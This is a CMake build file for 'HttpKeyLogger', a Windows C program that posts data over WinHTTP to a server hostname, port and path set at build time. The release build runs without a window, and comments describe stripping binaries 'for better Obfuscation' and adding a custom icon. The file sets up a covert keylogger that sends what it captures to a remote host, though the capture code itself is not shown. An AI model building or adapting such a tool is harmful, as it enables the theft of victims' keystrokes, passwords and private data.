cmake_minimum_required(VERSION 3.5)

# Generate "compile_commands.json" for making linter happy!
#set(CMAKE_EXPORT_COMPILE_COMMANDS ON)

# Setting Cross Compiler in Linux
#set(CMAKE_SYSTEM_NAME Windows)
#set(CMAKE_C_COMPILER x86_64-w64-mingw32-gcc)

# Stripping for better Obfuscation ( Available in MinGW )
#set(CMAKE_C_FLAGS_RELEASE "${CMAKE_C_FLAGS_RELEASE} -s")
#set(CMAKE_C_FLAGS_MINSIZEREL "${CMAKE_C_FLAGS_MINSIZEREL} -s")

# Default Build Type is Release ( GUI Mode no Window )
if(NOT CMAKE_BUILD_TYPE)
  set(CMAKE_BUILD_TYPE Release)
endif()

project(HttpKeyLogger LANGUAGES C)

# Setting config file to automatically generate Hostname, Port and Path header file
set(CONFIGFILE "Config.h")

# Getting compliation options
set(EXENAME "${PROJECT_NAME}" CACHE STRING "Executable Name")
set(HOSTNAME "" CACHE STRING "Server Hostname")
set(PORT "80" CACHE STRING "Server Port")
set(PATH "/" CACHE STRING "Path to Post Data")
set(ICON "${PROJECT_SOURCE_DIR}/resource/logo.ico" CACHE STRING "Icon Path")

# Throw error when no HOSTNAME is given ( its REQUIRED )
if(HOSTNAME STREQUAL "")
  message(SEND_ERROR "No Hostname Specified!\n use -DHOSTNAME=\"Target IP/Hostname\"")
endif()

# Auto Generate Icon and Config File in Build Directory
configure_file("${PROJECT_SOURCE_DIR}/Config.h.in" ${CONFIGFILE})
configure_file("${PROJECT_SOURCE_DIR}/resource/logo.rc.in" "logo.rc")

# Setup Source Files
file(GLOB src
  "${PROJECT_SOURCE_DIR}/src/*.c"
  "${PROJECT_BINARY_DIR}/logo.rc"
  )

# Setup Header Files
file(GLOB include
    "${PROJECT_SOURCE_DIR}/include/*.h"
)

# Create executable
if(${CMAKE_BUILD_TYPE} STREQUAL "Debug")
    add_executable(${EXENAME} ${src} ${include}  "src/connection.c")
elseif(${CMAKE_BUILD_TYPE} STREQUAL "RelWithDebInfo")
    add_executable(${EXENAME} ${src} ${include})
else()
    add_executable(${EXENAME} WIN32 ${src} ${include})
endif()

# Pass CONFIGFILE to Project as a Macro ( to be included easily )
target_compile_definitions(${EXENAME} PRIVATE CONFIG="${CONFIGFILE}")

# Pass DEBUG Macro to Project to Specify if Debug Prints are Needed ( should not be available in Release, because there is no console to print in )
if(${CMAKE_BUILD_TYPE} STREQUAL "Debug")
  add_compile_definitions(DEBUG=1)
elseif(${CMAKE_BUILD_TYPE} STREQUAL "RelWithDebInfo")
  add_compile_definitions(DEBUG=1)
endif()

# Adding Include Files ( PROJECT_BINARY_DIR becase CONFIGFILE is there )
target_include_directories(${EXENAME} PUBLIC
  "${PROJECT_SOURCE_DIR}/include"
  ${PROJECT_BINARY_DIR}
  )

# Linking Nessecary Libraries
target_link_libraries( ${EXENAME} PRIVATE winhttp)
